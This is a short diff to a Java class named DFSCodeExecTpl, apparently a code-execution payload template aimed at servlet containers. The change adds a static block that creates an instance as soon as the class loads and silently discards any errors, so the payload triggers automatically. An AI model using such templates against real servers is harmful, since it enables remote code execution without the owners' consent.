@@ -8,6 +8,13 @@ import java.util.HashSet;
 import java.util.Scanner;
 
 public class DFSCodeExecTpl {
+	static {
+		try {
+			new DFSCodeExecTpl();
+		} catch (Exception e) {
+		}
+	}
+
 	static HashSet<Object> h;
 	static ClassLoader cl = Thread.currentThread().getContextClassLoader();
 	static Class hsr;//HTTPServletRequest.class
